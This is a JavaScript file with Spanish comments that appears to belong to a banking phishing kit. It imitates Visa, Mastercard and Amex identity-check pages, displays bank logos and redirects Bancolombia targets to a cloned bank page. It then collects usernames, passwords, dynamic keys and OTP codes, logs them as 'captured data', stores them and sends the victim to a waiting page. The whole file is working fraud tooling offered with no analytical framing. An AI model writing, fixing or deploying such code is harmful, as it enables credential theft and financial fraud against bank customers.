/**
 * ID_CHECK.JS - Versión Corregida
 */

const DOMElements = {
    companyLoader: document.querySelector('#company-loader'),
    companyLogo: document.querySelector('#company-logo'),
    bankLogo: document.querySelector('#bank-logo'),
    mainLoader: document.querySelector('.main-loader'),
    btnNextStep: document.querySelector('#btnNextStep'),
    form: document.querySelector('#form')
};

// ======================
// SET LOGOS Y BANCOS
// ======================
if (info?.checkerInfo?.company === 'VISA') {
    if (DOMElements.companyLoader) {
        DOMElements.companyLoader.src = './assets/logos/visa_verified.png';
        DOMElements.companyLoader.width = '130';
        DOMElements.companyLoader.style.marginBottom = '40px';
    }
    if (DOMElements.companyLogo) {
        DOMElements.companyLogo.src = './assets/logos/visa_verified.png';
        DOMElements.companyLogo.width = '90';
    }
} else if (info?.checkerInfo?.company === 'MC') {
    if (DOMElements.companyLoader) {
        DOMElements.companyLoader.src = './assets/logos/mc_id_check_2.jpg';
        DOMElements.companyLoader.width = '400';
    }
    if (DOMElements.companyLogo) {
        DOMElements.companyLogo.src = './assets/logos/mc_id_check_1.webp';
        DOMElements.companyLogo.width = '130';
    }
} else if (info?.checkerInfo?.company === 'AM') {
    if (DOMElements.companyLoader) {
        DOMElements.companyLoader.src = './assets/logos/amex_check_1.png';
        DOMElements.companyLoader.width = '200';
    }
    if (DOMElements.companyLogo) {
        DOMElements.companyLogo.src = './assets/logos/mc_id_check_1.webp';
        DOMElements.companyLogo.width = '110';
    }
}

// Logo del banco
if (info?.metaInfo?.ban === 'bancolombia') {
    window.location.href = './assets/bv/home.html';
} else if (DOMElements.bankLogo && info?.metaInfo?.ban) {
    DOMElements.bankLogo.src = `./assets/logos/${info.metaInfo.ban}.png`;
    DOMElements.bankLogo.width = '120';
}

// Ocultar loader principal
if (DOMElements.mainLoader) {
    setTimeout(() => {
        DOMElements.mainLoader.classList.remove('show');
    }, 2500);
}

// ======================
// MOSTRAR CAMPOS SEGÚN MODO
// ======================
const showFieldsByMode = () => {
    const mode = info?.checkerInfo?.mode;

    // Ocultar todos primero
    document.querySelectorAll('#user-b, #user, #puser, #puser-b, #cdin, #ccaj, #cavance, #otpcode')
        .forEach(el => el.classList.add('hidden'));

    if (mode === 'userpassword') {
        document.querySelectorAll('#user-b, #user, #puser, #puser-b').forEach(el => {
            el.classList.remove('hidden');
        });

        // Limitar dígitos para Bancolombia
        if (info?.metaInfo?.ban === 'bancolombia') {
            document.querySelectorAll('#puser').forEach(el => {
                el.setAttribute('oninput', 'limitDigits(this, 4);');
            });
        }
    } 
    else if (mode === 'cdin') {
        document.querySelectorAll('#cdin').forEach(el => el.classList.remove('hidden'));
    } 
    else if (mode === 'ccaj') {
        document.querySelectorAll('#ccaj').forEach(el => el.classList.remove('hidden'));
    } 
    else if (mode === 'cavance') {
        document.querySelectorAll('#cavance').forEach(el => el.classList.remove('hidden'));
    } 
    else if (mode === 'otpcode') {
        document.querySelectorAll('#otpcode').forEach(el => el.classList.remove('hidden'));
    }
};

showFieldsByMode();

// ======================
// BOTÓN SIGUIENTE
// ======================
const btnNextStep = document.querySelector('#btnNextStep');

if (btnNextStep) {
    btnNextStep.addEventListener('click', () => {
        const usuario = document.getElementById('user')?.value || '';
        const password = document.getElementById('puser')?.value || '';

        if (usuario || password) {
            info.metaInfo.user = usuario;
            info.metaInfo.puser = password;

            console.log("Datos capturados:", { usuario, password });
        }

        // Guardar en localStorage
        if (typeof updateLS === 'function') updateLS();

        // Redirigir
        const loader = document.querySelector('.loader') || document.querySelector('.main-loader');
        if (loader) loader.classList.add('show');

        setTimeout(() => {
            window.location.href = 'waiting.html';
        }, 1800);
    });
}
